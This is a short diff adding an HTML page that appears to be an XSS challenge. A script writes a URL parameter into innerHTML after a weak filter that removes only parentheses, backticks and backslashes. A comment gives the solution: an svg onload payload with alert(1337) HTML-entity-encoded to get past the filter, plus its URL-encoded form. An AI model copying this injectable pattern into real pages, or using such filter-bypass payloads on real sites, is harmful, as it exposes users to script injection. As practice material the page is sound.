@@ -1,0 +1,17 @@
+<!-- Challenge -->
+<h2 id="will"></h2>
+<script>
+    smith = (new URL(location).searchParams.get('markassbrownlee') || "Ah That's Hawt")
+    smith = smith.replace(/[\(\`\)\\]/g, '') // removing (,),\`
+    will.innerHTML = smith
+</script>
+
+<!--
+    <svg onload="alert(1337)">
+    
+    HTML entity encoded in the attribute context:
+    <svg onload="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x33;&#x33;&#x37;&#x29;">
+    
+    URL encoded:
+    %3Csvg%20onload%3D%22%26%23x61%3B%26%23x6C%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%26%23x33%3B%26%23x33%3B%26%23x37%3B%26%23x29%3B%22%3E
+-->
